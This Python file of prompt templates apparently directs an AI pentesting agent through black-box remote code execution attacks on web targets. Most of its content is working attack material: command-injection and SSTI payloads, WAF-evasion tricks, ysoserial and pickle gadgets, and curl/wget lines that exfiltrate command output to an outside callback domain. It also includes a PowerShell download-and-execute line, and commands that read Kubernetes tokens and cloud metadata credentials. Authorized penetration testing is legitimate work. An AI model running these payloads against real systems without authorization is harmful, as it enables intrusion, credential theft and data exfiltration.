"""
RedAmon Remote Code Execution (RCE) Prompts

Black-box workflows for RCE testing across the six classic primitives:
command injection, server-side template injection (SSTI), insecure deserialization,
dynamic eval / expression languages, media + document pipeline RCE, and SSRF-to-RCE.

Synthesis:
- Strix rce.md: taxonomy, payload matrices, evasion, post-exploitation pivots
- Shannon vuln-injection.txt + exploit-injection.txt: OWASP exploitation stages
  (Confirmation -> Fingerprinting -> Exfiltration -> Critical Impact), proof
  levels 1-4, false-positive gate. White-box / source-code / deliverable-file
  instructions are intentionally stripped -- RedAmon agents have no source access.
"""


# =============================================================================
# RCE MAIN WORKFLOW (.format()-templated; uses {{ }} for literal braces)
# =============================================================================

RCE_TOOLS = """
## ATTACK SKILL: REMOTE CODE EXECUTION (RCE)

**CRITICAL: This attack skill has been CLASSIFIED as Remote Code Execution.**
**You MUST follow the RCE workflow below. Do NOT switch to other attack methods.**

This skill covers the SIX classic RCE primitives:
1. OS command injection (shell wrappers, argument injection)
2. Server-side template injection (SSTI) -- Jinja2, Twig, Freemarker, Velocity, EJS, Thymeleaf
3. Insecure deserialization -- Java, .NET, PHP, Python, Ruby
4. Dynamic eval / expression languages -- OGNL, SpEL, MVEL, EL, JS eval, Python exec
5. Media + document pipelines -- ImageMagick, Ghostscript, ExifTool, LaTeX, ffmpeg
6. SSRF-to-RCE chains -- gopher://, FastCGI, Redis, internal admin UIs

---

## PRE-CONFIGURED SETTINGS (from project settings)

```
OOB blind-RCE callbacks (interactsh):    {rce_oob_callback_enabled}
Deserialization gadgets (ysoserial):     {rce_deserialization_enabled}
Aggressive payloads (file write / shell):{rce_aggressive_payloads}
```

**Hard rules:**
- Test ONE parameter at a time. Spray-and-pray triggers WAFs and burns the engagement.
- Establish a QUIET ORACLE (timing or OOB) BEFORE noisy payloads. A single
  `;sleep 1` confirms execution; `;sleep 30` looks like a DoS attempt.
- NEVER deploy a persistent web shell, modify cron, or write to web roots unless
  `RCE_AGGRESSIVE_PAYLOADS` is True. Read-only proofs (`id`, `whoami`, `cat /etc/passwd`)
  are sufficient to demonstrate impact.
- Default to OOB DNS oracle when available -- it has the lowest target footprint.
- Treat WAF-encoded errors and 500s as data points, NOT proof. Proof requires a
  controlled output you can correlate to your input.

---

## MANDATORY RCE WORKFLOW

### Step 1: Reuse recon (query_graph, <5s)

Before crafting any payload, pull what recon already discovered:

```cypher
MATCH (e:Endpoint) WHERE e.url CONTAINS '<target_host>' RETURN e.url, e.method LIMIT 50
MATCH (p:Parameter) WHERE p.endpoint CONTAINS '<target_host>' RETURN p.name, p.location, p.endpoint LIMIT 100
MATCH (t:Technology) WHERE t.host CONTAINS '<target_host>' RETURN t.name, t.version
MATCH (h:Host {{ip:'<target_ip>'}})-[:RUNS]->(s:Service) RETURN s.port, s.product, s.version
```

The Technology node is critical -- it tells you which RCE primitive to prioritize:
- Java / Spring / Struts / WebLogic -> deserialization, OGNL/SpEL
- PHP / Laravel / WordPress / Drupal -> unserialize, command_exec wrappers
- Python / Flask / Django / Jinja2 -> SSTI, pickle, subprocess
- Node.js / Express / Next.js -> eval, template engines (EJS/Pug), child_process
- Ruby / Rails -> ERB SSTI, Marshal.load, system()
- .NET / ASP.NET -> ViewState, BinaryFormatter, MVEL

If the graph has parameter and tech data, skip discovery and jump to Step 3 with a
ranked sink list. If the graph is sparse, do Step 2 first.

**After Step 1, request `transition_phase` to exploitation before proceeding.**

### Step 2: Surface candidate sinks (execute_curl + execute_playwright)

Map the request surface to the six primitives. For each parameter found in recon
or rendered by the page, classify its likely sink class:

```
execute_curl({{"args": "-s -i 'http://TARGET/path?param=test'"}})
execute_playwright({{"url": "http://TARGET/path", "format": "html"}})
```

Look for:
- **CMD candidates:** params named `cmd`, `host`, `ip`, `addr`, `domain`, `url`,
  `target`, `file`, `name`, `path`, `query`, `q`, `lookup`, `ping`, `dns`, `exec`,
  `run`, `action`. Endpoints like `/diagnostic`, `/ping`, `/lookup`, `/admin/run`.
- **SSTI candidates:** params reflected in HTML, especially in error pages, email
  templates, or PDF generators. Look for `?name=`, `?greeting=`, `?subject=`,
  `?template=`, file conversion endpoints.
- **Deserialization candidates:** cookies/headers ending in `=` (base64), Java
  ViewState, ASP.NET `__VIEWSTATE`, PHP serialized blobs (`O:` or `a:` prefix),
  Python pickle markers (`\\x80\\x04`).
- **Media-pipeline candidates:** any file upload accepting images/PDFs/SVG.
  Check what runs on the backend: `Server`/`X-Powered-By` headers,
  ImageMagick / GraphicsMagick / Ghostscript / LibreOffice fingerprints.
- **SSRF -> RCE candidates:** any param consuming a URL (`url=`, `redirect=`,
  `callback=`, `webhook=`, `image_url=`, `xmlrpc.php`, fetch/proxy endpoints).

### Step 3: Establish a quiet oracle (BEFORE noisy payloads)

This step is non-negotiable. You cannot prove RCE without a deterministic oracle.
Pick the LEAST noisy oracle that fits the channel:

**Option A -- Time-based gate (no infrastructure needed)**

For each candidate parameter, send a baseline GET, measure time, then a 1-2s gated
delay payload, measure again:

```
execute_curl({{"args": "-s -o /dev/null -w '%{{time_total}}\\\\n' 'http://TARGET/path?param=test'"}})
execute_curl({{"args": "-s -o /dev/null -w '%{{time_total}}\\\\n' 'http://TARGET/path?param=test%3Bsleep%201'"}})
```

A consistent ~1s delta vs baseline = command injection confirmed (Level 1 proof).
Repeat with `;sleep 2` to rule out network jitter. Stop at 2s -- never go above 5s.

Time-based payloads by OS:
- Unix: `;sleep 1`, `` `sleep 1` ``, `$(sleep 1)`, `||sleep 1`, `&&sleep 1`
- Windows CMD: `& timeout /t 2 &`, `& ping -n 2 127.0.0.1 &`
- Windows PS: `; Start-Sleep -s 2 ;`

**Option B -- OOB DNS oracle (CONDITIONAL on `RCE_OOB_CALLBACK_ENABLED`=True)**

If OOB callbacks are enabled in settings, follow the **OOB / Blind RCE Workflow**
section below to register an interactsh domain. OOB beats time-based because it
proves outbound capability AND command execution in one shot, with zero noise.

**Option C -- Output-based (when input is reflected)**

If the parameter is reflected in the response, inject a token-producing command
and grep for it:

```
execute_curl({{"args": "-s 'http://TARGET/path?param=test%3Bid'"}})
```

Look for `uid=` in the response. This is the strongest proof: it gives you uid+gid
context for free.

### Step 4: Confirm exactly ONE primitive (OWASP Stage 1: Confirmation)

You MUST reach Level 1 proof (oracle confirmed) on ONE primitive before moving on.
Do not attempt multiple primitives in parallel -- the WAF will fingerprint and block you.

#### 4A. Command injection (most common, try first)

Tool: **commix** (already in kali_shell). Best for fast first-pass automation.

```
kali_shell({{"command": "commix -u 'http://TARGET/path?param=test*' --batch --level=2 --technique=tcfo --time-sec=2"}})
```

`*` marks the injection point. Techniques: `t`=time, `c`=classic, `f`=file-write,
`o`=output. Stop at `level=2` initially; only escalate to 3 if WAF blocks 1-2.

For POST data:
```
kali_shell({{"command": "commix -u 'http://TARGET/submit' --data='name=test*&csrf=ABC' --batch --level=2"}})
```

For headers (User-Agent, Cookie, Referer):
```
kali_shell({{"command": "commix -u 'http://TARGET/' --headers='User-Agent: Mozilla/5.0*' --batch"}})
```

If commix detects injection, capture the technique and the captured shell context
(uid, hostname). Move to Step 5 (fingerprinting).

If commix fails BUT your manual time-based oracle (Step 3A) succeeded, the WAF is
likely blocking commix's payload format. Drop to manual `execute_curl` payloads
from `RCE Payload Reference` -> "Command Injection".

#### 4B. SSTI (when parameter is reflected and tech is template-driven)

Tool: **sstimap** (already in kali_shell). Auto-detects 17 template engines.

```
kali_shell({{"command": "sstimap -u 'http://TARGET/path?param=*' --crawl 0"}})
```

For POST:
```
kali_shell({{"command": "sstimap -u 'http://TARGET/submit' --data 'name=*' -X POST"}})
```

If sstimap reports an engine + injection point, take the suggested PoC and re-run
manually via execute_curl to capture the exact payload form.

If sstimap fails but you suspect SSTI (param reflected in HTML, framework hints
present), drop to manual probes. See `RCE Payload Reference` -> SSTI section
for engine-specific math probes (Jinja2 `{{{{7*7}}}}`, Freemarker `${{7*7}}`,
ERB `<%= 7*7 %>`, etc.). If math evaluates -> SSTI confirmed.

#### 4C. Insecure deserialization (CONDITIONAL on `RCE_DESERIALIZATION_ENABLED`)

Only if `RCE_DESERIALIZATION_ENABLED`=True AND you identified a deserialization
candidate in Step 2. Follow the **Deserialization Workflow** section below.

#### 4D. Eval / expression-language

Less common but high-impact. Probe pattern (URL-encoded as needed):

```
?expr=1%2B1                                        -> reflects 2 = arithmetic eval
?expr=__import__('os').popen('id').read()          -> Python eval/exec
?expr=Runtime.getRuntime().exec('id')              -> Java OGNL/SpEL
?lang=javascript&code=process.mainModule.require('child_process').execSync('id')
                                                    -> Node.js vm/eval
```

Confirm via output reflection or OOB.

#### 4E. Media-pipeline RCE (only when file upload exists)

Generate a malicious file, upload via execute_curl multipart, observe processing:

```
# ImageMagick MSL/MVG (legacy ImageTragick variants)
kali_shell({{"command": "printf 'push graphic-context\\\\nfill \\\\\\"url(https://OOB_DOMAIN/x)\\\\\\"\\\\npop graphic-context\\\\n' > /tmp/exploit.mvg"}})
# upload exploit.mvg through the file-upload endpoint, watch interactsh

# Ghostscript via PDF (-dSAFER bypass on old versions)
# craft PostScript with %pipe%id file operator; trigger on PDF/PS conversion

# ExifTool DjVu CVE-2021-22204
# generate via execute_code: PoC exists in PoC-in-GitHub for the CVE

# LaTeX shell-escape (when --shell-escape is enabled)
kali_shell({{"command": "echo '\\\\\\\\immediate\\\\\\\\write18{{id > /tmp/o}}' > /tmp/exploit.tex"}})
```

Trigger the conversion via the upload endpoint, then check OOB for callback.

#### 4F. SSRF to RCE chain

When you already have SSRF (or detect it during Step 4 probing), pivot to RCE
through internal services. Most reliable chains:

```
# php-fpm via gopher:// (use Gopherus to build FCGI records)
kali_shell({{"command": "gopherus --exploit fastcgi /var/www/html/index.php"}})

# Redis via gopher:// (cron write or RDB module load)
kali_shell({{"command": "gopherus --exploit redis"}})

# Reach internal Jenkins script console / Spring Actuator /actuator/jolokia or /env
# /actuator/env (Spring Cloud) -> set spring.cloud.bootstrap.location to attacker URL
```

### Step 5: Fingerprint the execution context (OWASP Stage 2)

Once Step 4 produces Level 1 oracle proof, characterize WHAT you're executing as.
Run a one-shot enumeration in the same primitive that succeeded:

```
;id;uname -a;whoami;pwd;cat /etc/os-release;cat /proc/1/cgroup 2>/dev/null;ls -la /.dockerenv 2>/dev/null;echo END
```

Capture (Level 2 proof = Query Structure Manipulated):
- **Identity:** uid, gid, supplementary groups
- **Host:** kernel, distro, hostname
- **Filesystem:** cwd, $HOME, $PATH
- **Containerization:** `/.dockerenv` exists? `/proc/1/cgroup` mentions docker/kubepods?
- **Service account token (k8s):** `/var/run/secrets/kubernetes.io/serviceaccount/token` readable?

For Windows targets:
```
& whoami /all & systeminfo & net user & ipconfig /all & dir C:\\\\Users
```

If output is too large or quotes corrupt the response, base64-encode:

```
;(id;uname -a;whoami;pwd) | base64
```

Decode the response server-side via Python (`base64 -d`) to read.

### Step 6: Demonstrate impact (OWASP Stage 3: Targeted Exfiltration)

Read-only proofs (always allowed):

```
;cat /etc/passwd | head -20
;cat /etc/hostname
;cat /var/lib/secrets/* 2>/dev/null | head -50      # k8s mounted secrets
;env | grep -iE 'aws|key|token|secret|pass' | head
;cat /proc/self/environ | tr '\\\\0' '\\\\n' | head
;cat /var/run/secrets/kubernetes.io/serviceaccount/token   # k8s SA token
;curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/   # AWS metadata
;curl -s -H 'Metadata: true' http://169.254.169.254/metadata/instance?api-version=2021-02-01   # Azure
;curl -s -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token   # GCP
```

Stop here unless `RCE_AGGRESSIVE_PAYLOADS`=True. The above is enough for a Level 3
proof (Data Extraction Proven) and a critical-severity finding.

### Step 7: Critical impact (OWASP Stage 4) -- AGGRESSIVE PAYLOADS

{rce_aggressive_block}

### Step 8: Long-running exploitation (commix/sstimap >120s)

When commix or sstimap exceeds 120s, run in background and poll:

```
kali_shell({{"command": "commix -u 'http://TARGET/path?param=test*' --batch --level=3 > /tmp/commix.log 2>&1 & echo $!"}})
kali_shell({{"command": "tail -50 /tmp/commix.log"}})
kali_shell({{"command": "ps -p SAVED_PID >/dev/null && echo RUNNING || echo DONE"}})
```

### Step 9: Reporting requirements

The final report MUST contain:
- **Sink class** (one of: command_injection / SSTI / deserialization / eval / media_pipeline / ssrf_to_rce)
- **Primitive** (e.g. `;sleep 1` shell-metachar, Jinja2 math probe, PHP `O:` unserialize)
- **Oracle used** (timing / OOB DNS / output reflection)
- **Level reached** (1=injection point, 2=structure controlled, 3=data extracted, 4=critical impact)
- **Execution context** (uid, hostname, container/host, OS)
- **Exact reproducer** (full URL or curl command, payload encoded as actually sent)
- **Impact statement** (data accessed, lateral pivots possible, container escape feasibility)
- **Defenses observed** (WAF model + bypass technique used; SELinux/AppArmor; capabilities)

### Proof Levels (Shannon-derived rigor framework)

| Level | Evidence | Classification |
|-------|----------|----------------|
| 1 | Oracle fired (timing delta / OOB ping / reflected output) | POTENTIAL (low conf) |
| 2 | Identity context captured (uid, hostname) | POTENTIAL (med conf) |
| 3 | File read / sensitive data extracted | EXPLOITED |
| 4 | Cred theft, lateral movement, or container escape | EXPLOITED (CRITICAL) |

A finding below Level 3 with NO bypass attempts is a **FALSE POSITIVE** -- do NOT
report it. Only report Level 3+ as exploited; Level 1-2 with documented external
blockers (auth, infra) report as POTENTIAL.

### False positive gate

Before classifying a finding, verify:
- Did the oracle fire CONSISTENTLY across at least 3 attempts? (Single firings can
  be load spikes, not your payload.)
- Is the response derived from the executed command (output, timing) or could it
  be a static error / WAF block message?
- For timing oracles: is the delta >= 800ms vs baseline AND reproducible? Below
  that threshold = noise, not RCE.
- For SSTI: did `7*7` produce 49 (or `7*'7'` produce string repetition)? Just
  reflecting the literal probe text is NOT SSTI -- the engine must evaluate it.
"""


# =============================================================================
# AGGRESSIVE-PAYLOADS BLOCK (interpolated as a value into RCE_TOOLS, not formatted)
# =============================================================================

RCE_AGGRESSIVE_DISABLED = """**DISABLED** by project setting `RCE_AGGRESSIVE_PAYLOADS=False`.

Stop at Step 6 (read-only proofs). Do NOT:
- Write any file outside /tmp/
- Drop persistent web shells, cron, systemd, or service-restart hooks
- Run reverse shell payloads
- Modify any application file or database row
- Attempt container escape (mount manipulations, capability abuse)

If the engagement requires a Level 4 critical-impact proof, the operator must
explicitly enable `RCE_AGGRESSIVE_PAYLOADS` in project settings."""


RCE_AGGRESSIVE_ENABLED = """**ENABLED** by project setting `RCE_AGGRESSIVE_PAYLOADS=True`.

Critical-impact proofs (Level 4). Pick the MINIMUM viable proof; do not chain.

**File write under app constraints:**
```
;echo 'PROOF_WRITE_REDAMON' > /tmp/rce_proof_$$
;ls -la /tmp/rce_proof_*
```

**Reverse shell (only if explicitly requested by operator):**
- Generate via `msfvenom` in kali_shell, host via chisel/ngrok if behind NAT
- Use `set ExitOnSession false` so the handler stays available
- IMMEDIATELY take a screenshot of `id;uname -a;hostname` from the shell, then
  background it. Do NOT explore filesystem or move laterally without authorization.

**Container escape attempts (only if /.dockerenv or /proc/1/cgroup confirms container):**

```
# Mounted docker.sock (most common escape)
;ls -la /var/run/docker.sock
;curl --unix-socket /var/run/docker.sock http://localhost/containers/json
# If accessible -> container compromise via API

# CAP_SYS_ADMIN + cgroup release_agent (CVE-style)
;capsh --print 2>/dev/null | grep cap_sys_admin
# If present -> document as escape-feasible; do NOT execute the cgroup trick
# without explicit authorization

# k8s service account API access
;TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
;curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/default/pods
```

**Privilege escalation enumeration (Linux):**
```
;sudo -l 2>/dev/null
;find / -perm -4000 -type f 2>/dev/null | head -30   # SUID
;getcap -r / 2>/dev/null | head -30                   # capabilities
;cat /etc/crontab; ls -la /etc/cron.*/
```

Cross-reference findings against GTFOBins (in the agent's KB via web_search) for
known privesc paths.

**Cleanup obligation (MANDATORY):**
- Remove every file you wrote to the target. Confirm removal with `ls -la`.
- Do NOT leave reverse-shell handlers, exposed tunnels, or cron entries behind.
- Document each artifact created and confirmed removed in the final report."""


# =============================================================================
# OOB / BLIND RCE WORKFLOW (appended raw, NOT format-templated; single braces)
# =============================================================================

RCE_OOB_WORKFLOW = """
## OOB / Blind RCE Workflow (interactsh DNS+HTTP callbacks)

**Use this when:** the target does not reflect command output (blind), the WAF
blocks inline output, or you want a near-zero-noise oracle. Requires
`interactsh-client` (already in kali_shell).

---

### Step 1: Start interactsh-client as a background process

```
kali_shell({"command": "interactsh-client -server oast.fun -json -v > /tmp/interactsh.log 2>&1 & echo $!"})
```

**Save the PID** for later cleanup.

### Step 2: Read the registered callback domain

```
kali_shell({"command": "sleep 5 && head -20 /tmp/interactsh.log"})
```

Look for the `.oast.fun` domain (e.g. `abc123xyz.oast.fun`). This is your
**REGISTERED_DOMAIN**. It is cryptographically tied to the running client --
random subdomains will NOT route back.

### Step 3: Inject OOB payloads pointing at REGISTERED_DOMAIN

**Universal Unix DNS (works in 95% of environments):**
```
;nslookup `id`.REGISTERED_DOMAIN
;dig +short `whoami`.REGISTERED_DOMAIN
;ping -c 1 `hostname`.REGISTERED_DOMAIN
```

**HTTP exfil (richer payload, requires outbound 80/443):**
```
;curl http://REGISTERED_DOMAIN/`hostname`
;wget -q http://REGISTERED_DOMAIN/$(id|base64 -w0) -O /dev/null
```

**Windows variants:**
```
& nslookup %USERNAME%.REGISTERED_DOMAIN &
; powershell -c Resolve-DnsName ($env:USERNAME + '.REGISTERED_DOMAIN')
```

**SSTI engines that block backticks (use language-native HTTP):**
```
{{config.update(__import__('os').popen('curl http://REGISTERED_DOMAIN/$(id|base64 -w0)').read())}}   (Jinja2)
${<#assign x="freemarker.template.utility.Execute"?new()>${x("curl http://REGISTERED_DOMAIN/")}}     (Freemarker)
```

**Java deserialization (URLDNS gadget = pure DNS oracle, no payload exec):**
```
ysoserial URLDNS http://REGISTERED_DOMAIN > /tmp/payload.bin
# Then base64-encode and inject as the cookie/parameter
```

### Step 4: Poll for callbacks

```
kali_shell({"command": "tail -50 /tmp/interactsh.log"})
```

JSON lines you will see:
- `"protocol":"dns"` -> the subdomain prefix is the exfiltrated data
  - Example: `{"protocol":"dns","full-id":"www-data.abc123xyz.oast.fun"}` -> uid=www-data
- `"protocol":"http"` -> path/query carries the payload, base64-decode if needed
- `"remote-address"` -> the outbound IP of the target (often differs from the front-end IP)

Each protocol-DNS callback is Level 1 proof. Combined with extracted identity in
the subdomain prefix, that's Level 2.

### Step 5: Cleanup

```
kali_shell({"command": "kill SAVED_PID"})
kali_shell({"command": "rm /tmp/interactsh.log /tmp/payload.bin 2>/dev/null"})
```
"""


# =============================================================================
# DESERIALIZATION WORKFLOW (Java / PHP / Python / .NET / Ruby)
# =============================================================================

RCE_DESERIALIZATION_WORKFLOW = """
## Deserialization Workflow

**Use this when:** Step 2 surfaced a deserialization candidate (Java ViewState,
ASP.NET `__VIEWSTATE`, PHP serialized blob, Python pickle, Ruby Marshal, .NET
BinaryFormatter). Requires `RCE_DESERIALIZATION_ENABLED`=True.

The black-box deserialization workflow is: identify the format, generate a gadget,
inject, observe oracle.

---

### Format identification

Decode the suspect blob (cookie, header, body field):

```
echo "BLOB" | base64 -d | xxd | head -10
```

Magic bytes:
- `aced 0005` (or `\\xac\\xed`) -> **Java serialized object**
- `4f 3a 38 3a` (`O:8:`) or `61 3a 32 3a` (`a:2:`) -> **PHP serialized**
- `80 04` (or `80 02`/`80 03`/`80 05`) -> **Python pickle**
- `04 08` -> **Ruby Marshal**
- `7b "_v" :` (JSON) with `_v_/_t_` keys -> **JSON.NET TypeNameHandling**
- ASP.NET `__VIEWSTATE=/wEP...` (base64) -> **.NET BinaryFormatter / LosFormatter**

### Java deserialization (ysoserial)

`ysoserial` is preinstalled in kali_shell (`/usr/bin/ysoserial`). Generate a
gadget chain matching the target's classpath. Common chains and when to use them:

| Chain | Library required on target | Typical apps |
|-------|---------------------------|--------------|
| `URLDNS` | none (just JDK) | Universal blind oracle (DNS only, no exec) |
| `CommonsCollections1` | commons-collections <= 3.2.1 | Old Java EE apps |
| `CommonsCollections6` | commons-collections 3.x or 4.x | Most current targets |
| `CommonsCollections7` | commons-collections | Newer JDKs |
| `CommonsBeanutils1` | commons-beanutils | Spring stack |
| `Spring1` | spring-core | Spring Boot apps |
| `Hibernate1` / `Hibernate2` | hibernate | JPA / Hibernate apps |
| `JRE8u20` | none | Native JDK 8 only (rare success) |
| `Click1` | Apache Click | Legacy Click framework |

Workflow:

```
# Step 1: confirm reachability with URLDNS (no library required)
kali_shell({"command": "ysoserial URLDNS http://REGISTERED_DOMAIN > /tmp/urldns.bin"})
kali_shell({"command": "base64 -w0 /tmp/urldns.bin"})
# Inject the base64 as the cookie/param/header. Watch interactsh for DNS hit.

# Step 2: once DNS fires, escalate to a real chain
kali_shell({"command": "ysoserial CommonsCollections6 'curl http://REGISTERED_DOMAIN/$(id|base64 -w0)' > /tmp/cc6.bin"})
kali_shell({"command": "base64 -w0 /tmp/cc6.bin"})

# Step 3: if commons-collections is unavailable but Spring is, swap chains:
kali_shell({"command": "ysoserial Spring1 'id' > /tmp/spring.bin"})
```

Inject via execute_curl, encoding as the channel requires (cookie often needs
URL-encoding of `+`, `=`, `/`).

### .NET deserialization

`ysoserial.net` is NOT preinstalled. If `KALI_INSTALL_ENABLED`=True, request install
via the kali install flow. Otherwise, hand-craft via `execute_code` (PowerShell
gadget generation in pwsh) or skip in favor of another primitive.

`__VIEWSTATE` without MAC -> use ysoserial.net `TextFormattingRunProperties` gadget.

### PHP deserialization (manual; phpggc not preinstalled)

Hand-craft a payload using `execute_code` (Python harness). Look up the target
framework's gadget chain (laravel, symfony, magento, wordpress, joomla, drupal):

```python
# example placeholder; replace with the framework-specific gadget chain
payload = 'O:8:"stdClass":1:{s:1:"x";s:0:"";}'
import base64
print(base64.b64encode(payload.encode()).decode())
```

Inject as cookie or POST body. Confirm via OOB.

### Python pickle

If the target accepts a pickle (e.g. legacy `pickle.loads(request.cookies['data'])`),
generate via `execute_code`:

```python
import pickle, base64, os
class P:
    def __reduce__(self):
        return (os.system, ('curl http://REGISTERED_DOMAIN/$(id|base64 -w0)',))
payload = base64.b64encode(pickle.dumps(P())).decode()
print(payload)
```

### Ruby Marshal

```
kali_shell({"command": "ruby -rerb -e 'puts [Marshal.dump(ERB.new(\\"<%=`id`%>\\"))].pack(\\"m0\\")'"})
```

Less common; only when `Marshal.load` is reachable from user input.

### Cross-format detection probe

If you cannot identify the format from magic bytes, send each format's "harmless"
probe and watch for distinct error fingerprints:

| Probe | Triggers if |
|-------|-------------|
| `aced0005737200000000` (truncated Java) | Java serialization (StreamCorruptedException) |
| `O:1:"X":0:{}` (PHP) | PHP unserialize (ErrorException about class) |
| `\\x80\\x04N.` (Python pickle None) | Python pickle (UnpicklingError or KeyError) |
| `\\x04\\x08T` (Ruby Marshal true) | Ruby Marshal (TypeError) |

Distinct error pages = format confirmed even before gadget chain selection.
"""


# =============================================================================
# RCE PAYLOAD REFERENCE (appended raw, single braces)
# =============================================================================

RCE_PAYLOAD_REFERENCE = """
## RCE Payload Reference

Look up by primitive identified in Step 4. Always test the smallest/quietest
payload first; only escalate complexity if the simple one is filtered.

### Command Injection -- Unix shell metacharacters

Separators (try in this order, low->high noise):
```
;id
|id
&&id
||id
`id`
$(id)
%0aid                                    (newline; URL-encoded LF)
%0did                                    (CR)
${IFS}id                                 (IFS-spaced; bypasses space filters)
```

Argument injection (when input lands in a CLI flag):
```
--output=/tmp/x ; id
" --version "; id; "
-oProxyCommand=`id`             (ssh client argument injection)
```

Path / builtin confusion:
```
/usr/bin/id                              (absolute path; bypasses PATH manipulation)
/???/??t /???/p?sswd                     (glob to read /etc/passwd via cat; busybox)
```

Whitespace evasion:
```
{cat,/etc/passwd}
cat$IFS/etc/passwd
cat${IFS}/etc/passwd
{cat<>/etc/passwd}
```

Token splitting:
```
w'h'o'a'm'i
w"h"o"a"m"i
w\\h\\o\\a\\m\\i
$@\\u0069d                              (Bash $@ + escaped 'i')
```

Variable building (when chars are blacklisted):
```
a=i;b=d;$a$b
a=$'\\x69\\x64';$a
$0<<<$0\\<\\<\\<id                       (heredoc-via-bash)
```

Base64 stagers (when payload chars are filtered):
```
echo aWQ= | base64 -d | sh
$(echo aWQ= | base64 -d | sh)
```

### Command Injection -- Windows

CMD:
```
& whoami
| whoami
& dir &
&& whoami
^& whoami
& net user &
```

PowerShell:
```
; Get-Process
; iex (iwr http://REGISTERED_DOMAIN/x.ps1)
; [Convert]::FromBase64String('cG93ZXJzaGVsbA==') | %{$_}
```

UAC-aware quote bypass:
```
"&whoami&"
")&whoami&("
```

### SSTI by engine

**Jinja2 (Python: Flask, Django when configured)**
```
{{7*7}}                                    -> 49
{{7*'7'}}                                  -> 7777777
{{config}}                                 -> dumps Flask config (often has SECRET_KEY)
{{config.items()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{lipsum.__globals__.os.popen('id').read()}}
```

**Twig (PHP)**
```
{{7*7}}                                    -> 49
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
{{['id']|filter('system')}}
{{['id']|map('system')|join(',')}}
```

**Freemarker (Java)**
```
${7*7}                                                                                  -> 49
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder",["/bin/sh","-c","id"]).start()}
```

**Velocity (Java)**
```
#set($x="")##
#set($rt=$x.class.forName("java.lang.Runtime"))##
#set($chr=$x.class.forName("java.lang.Character"))##
#set($str=$x.class.forName("java.lang.String"))##
#set($ex=$rt.getMethod("exec",[$str]).invoke($rt.getMethod("getRuntime").invoke(null),"id"))
$ex.waitFor()
```

**EJS (Node.js)**
```
<%= global.process.mainModule.require('child_process').execSync('id') %>
<%= 7*7 %>                                    -> 49 (probe)
```

**Handlebars (Node.js)**
```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}{{this.push "return require('child_process').execSync('id');"}}{{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

**Thymeleaf (Java/Spring)**
```
${T(java.lang.Runtime).getRuntime().exec('id')}
*{T(java.lang.Runtime).getRuntime().exec('id')}
```

**Pug (Node.js)**
```
#{ root.process.mainModule.require('child_process').execSync('id') }
```

**ERB (Ruby)**
```
<%= `id` %>
<%= IO.popen('id').read %>
<%= system('id') %>
```

### Eval / expression languages

**OGNL (Struts 2)**
```
%{(#a=@java.lang.Runtime@getRuntime().exec('id')).getInputStream()}
```

**SpEL (Spring)**
```
T(java.lang.Runtime).getRuntime().exec('id')
new ProcessBuilder({'sh','-c','id'}).start()
```

**MVEL (Drools)**
```
import java.lang.Runtime; Runtime.getRuntime().exec('id');
```

**JS eval (Node.js)**
```
require('child_process').execSync('id').toString()
process.mainModule.require('child_process').execSync('id')
global.process.mainModule.require('child_process').execSync('id')
```

**Python eval / exec**
```
__import__('os').popen('id').read()
__import__('subprocess').check_output(['id'])
().__class__.__bases__[0].__subclasses__()[<idx>](['id'])    (find Popen subclass)
```

### WAF bypass quick reference

| Technique | Example | Use when |
|-----------|---------|----------|
| URL encode | `%3B%69%64` for `;id` | Special chars blocked |
| Double URL | `%253B%2569%2564` | Single-decode WAF |
| Unicode | `\\u003bid` (in JS context) | Unicode-aware filter |
| Comment break | `i/**/d` (in SQL/SSTI) | Keyword blacklist |
| Glob expand | `/???/??t` for `/bin/cat` | `/etc/`, `cat` blacklisted |
| Wildcard binary | `/bin/c?t` | Char-level blacklist |
| Base64 stager | `echo Y2F0... | base64 -d | sh` | All cmd chars blocked |
| Variable | `a=ca;b=t;$a$b /etc/passwd` | Keyword blacklist |
| Reverse string | `$(rev<<<'i d')` | Heuristic content match |
| Hex escape | `$'\\x69\\x64'` | Char-level filter |
| Tab / CR | `%09`, `%0d` instead of space | Space-only stripping |

### CVE / N-day RCE quick checks (run via execute_nuclei FIRST)

```
execute_nuclei({"args": "-u http://TARGET -tags rce,oast -severity critical,high -timeout 10"})
execute_nuclei({"args": "-u http://TARGET -tags log4j -timeout 10"})            # Log4Shell
execute_nuclei({"args": "-u http://TARGET -tags spring4shell -timeout 10"})      # Spring4Shell
execute_nuclei({"args": "-u http://TARGET -tags struts -timeout 10"})            # Struts OGNL
```

Common patterns to check manually:
- **Log4Shell (CVE-2021-44228):** `${jndi:ldap://REGISTERED_DOMAIN/x}` in any header
  (User-Agent, Referer, X-Forwarded-For, X-Api-Version), URL param, or POST body.
- **Spring4Shell (CVE-2022-22965):** Spring-MVC binding -> class.module.classLoader.*
  POST `class.module.classLoader.URLs[0]=...`.
- **CVE-2017-5638 (Struts S2-045):** `Content-Type` header with `%{(#cmd='id')...}`.
- **Ghostscript -dSAFER bypass:** any pre-2018 Ghostscript on PDF/PS uploads.
- **ImageMagick MSL/MVG (ImageTragick):** convert any user image with crafted MVG.

### Container / Kubernetes RCE pivots (post-Level-3)

Run only after confirming the target IS containerized via Step 5:

```
;ls -la /.dockerenv
;cat /proc/1/cgroup | grep -E 'docker|kubepods'
```

Container indicators -> attempt:

```
# docker.sock mounted in container
;test -S /var/run/docker.sock && echo MOUNTED

# k8s service account
;cat /var/run/secrets/kubernetes.io/serviceaccount/token
;cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
